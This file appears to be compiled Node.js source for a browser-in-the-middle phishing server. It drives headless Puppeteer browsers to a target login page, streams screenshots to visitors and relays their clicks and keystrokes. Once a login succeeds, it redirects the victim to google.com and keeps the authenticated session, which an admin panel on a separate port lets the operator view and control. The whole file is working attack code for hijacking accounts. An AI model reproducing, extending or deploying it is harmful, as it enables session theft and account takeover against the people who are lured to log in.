"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const ws_1 = __importDefault(require("ws"));
const fs_1 = __importDefault(require("fs"));
const puppeteer_1 = __importDefault(require("puppeteer"));
const HOSTNAME = "ws://localhost:8080";
const PORT = 8080;
const ADMIN_PORT = 3333;
const SCREENSHOT_DELAY_TARGET = 150;
const URL_BASE = 'https://hellooo';
const START_PATH = '/login';
const SUCCESS_URL = "<loggedinurlsuffix>/"; // TODO: Make regex
const REDIRECT_TO = 'https://google.com/';
const FREE_PAGE_POOL_SIZE = 3;
const LOG_FILE = "logs.txt";
const app = (0, express_1.default)();
const adminApp = (0, express_1.default)();
let logStream = fs_1.default.createWriteStream(LOG_FILE, { flags: 'a' });
let freePages = [];
let activePages = new Map();
let oldPages = new Map();
ensureFreePagePool();
function log(msg) {
    logStream.write(msg + "\n");
    console.log("LOG: " + msg);
}
function ensureFreePagePool() {
    log("ensureFreePagePool");
    (() => __awaiter(this, void 0, void 0, function* () {
        while (freePages.length < FREE_PAGE_POOL_SIZE) {
            let browser = yield puppeteer_1.default.launch();
            let page = yield browser.newPage();
            log("Page created");
            // Try to enable download upon click
            let cdpSession = yield page.target().createCDPSession();
            cdpSession.send('Browser.setDownloadBehavior', {
                behavior: 'allow',
                downloadPath: 'downloads',
            });
            yield page.goto(URL_BASE + START_PATH);
            log("Navigation complete");
            freePages.push(page);
        }
    }))();
}
// https://stackoverflow.com/a/1349426
function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function archivePage(pageId) {
    let page = activePages.get(pageId);
    if (page !== undefined) {
        activePages.delete(pageId);
        oldPages.set(pageId, page);
    }
    else {
        log("WARN: active page was missing for " + pageId);
    }
}
function sendViewer(pageId, isAdmin, res) {
    let data = fs_1.default.readFileSync('client.html', 'utf8');
    res.send(data
        .replace("{{PAGE_ID}}", pageId)
        .replace("{{HOST}}", HOSTNAME)
        // Have to use mouse to paste in the text box because we capture all key strokes at document level
        .replace("{{ADMIN_CONTROLS}}", isAdmin ? "<div style='background-color:red;display:flex;justify-content:space-around;'><div><input id='text' type='text' style='width:500;'/><input id='submit' type='submit' value='Go'/></div></div>" : ""));
}
function setupScreenshots(socket, pageId) {
    setTimeout(() => takeScreenshot(socket, pageId), SCREENSHOT_DELAY_TARGET);
}
function takeScreenshot(socket, pageId) {
    let startTime = Date.now();
    let page = activePages.get(pageId);
    if (page !== undefined) {
        page.screenshot({ type: "jpeg", quality: 100 })
            .then((res) => {
            socket.send(JSON.stringify({ t: "ss", data: res.toString('base64') }));
            let delay = SCREENSHOT_DELAY_TARGET - (Date.now() - startTime);
            if (delay < 0) {
                delay = 0;
            }
            setTimeout(() => takeScreenshot(socket, pageId), delay);
        }).catch(err => {
            log("Failed to get ss for " + pageId + ": " + err);
        });
    }
}
adminApp.get("/", (req, res) => {
    let html = "<html>";
    html += "<h1>Admin Panel</h1>";
    html += "<h2>Old Pages</h2>";
    for (const [key, value] of oldPages) {
        html += "<a href='/view/" + key + "'>" + key + "</a><br/>";
    }
    html += "</html>";
    res.send(html);
});
adminApp.get("/view/:id", (req, res) => {
    sendViewer(req.params.id, true, res);
});
const adminServer = adminApp.listen(ADMIN_PORT, () => {
    log(`admin server started at http://localhost:${ADMIN_PORT}`);
});
app.get("/favicon.ico", (req, res) => {
    res.sendFile("favicon.ico", { root: __dirname + "/../" });
});
app.get("/check", (req, res) => {
    res.send("OK");
});
app.get("/*", (req, res) => {
    log("Received GET at " + req.originalUrl);
    sendViewer(makeid(16), false, res);
});
const wsServer = new ws_1.default.Server({ noServer: true });
wsServer.on('connection', socket => {
    let pageId = "waiting";
    socket.on('message', message => {
        let s = new String(message);
        // log("Message received for " + pageId + ": " + s);
        let obj = JSON.parse(s.toString());
        pageId = obj.id;
        if (obj.t == "init") {
            let page;
            if (oldPages.has(pageId)) {
                page = oldPages.get(pageId);
                oldPages.delete(pageId);
                activePages.set(pageId, page);
                log("Page " + pageId + " moved from old to active");
            }
            else if (activePages.has(pageId)) {
                log("Attempted to connect to already-active page " + pageId);
                return;
            }
            else {
                page = freePages.pop();
                activePages.set(pageId, page);
                page.setViewport({ width: obj.w, height: obj.h });
                // Only used for new pages
                let successChecker = (res) => {
                    if (page.url().endsWith(SUCCESS_URL)) { // endsWith or includes depending on url; would be better as regex
                        log("Was success, redirecting to actual endpoint page " + pageId);
                        socket.send(JSON.stringify({ t: "redirect", to: REDIRECT_TO }));
                        page.off('response', successChecker);
                        archivePage(pageId);
                    }
                };
                page.on('response', successChecker);
                log("Grabbed free page for pageId " + pageId);
            }
            if (page === undefined) {
                log("Got undefined page");
            }
            setupScreenshots(socket, pageId);
            page.title()
                .then(res => {
                socket.send(JSON.stringify({ t: "title", title: res }));
            }).catch(err => log("Failed to get title for " + pageId + ": " + err));
            ensureFreePagePool();
        }
        else if (obj.t == "click") {
            let page = activePages.get(pageId);
            page.mouse.click(obj.x, obj.y);
        }
        else if (obj.t == "type") {
            let page = activePages.get(pageId);
            page.keyboard.press(obj.k);
        }
        else if (obj.t == "nav") {
            let page = activePages.get(pageId);
            (() => __awaiter(void 0, void 0, void 0, function* () {
                yield page.goto(obj.url);
                console.log("Navigated to " + obj.url);
            }))();
        }
    });
    socket.on('close', server => {
        log("Socket closed removing " + pageId + " from active pages");
        archivePage(pageId);
    });
});
const server = app.listen(PORT, () => {
    log(`server started at http://localhost:${PORT}`);
});
// Allow upgrading to web socket
server.on('upgrade', (request, socket, head) => {
    wsServer.handleUpgrade(request, socket, head, socket => {
        wsServer.emit('connection', socket, request);
    });
});
//# sourceMappingURL=index.js.map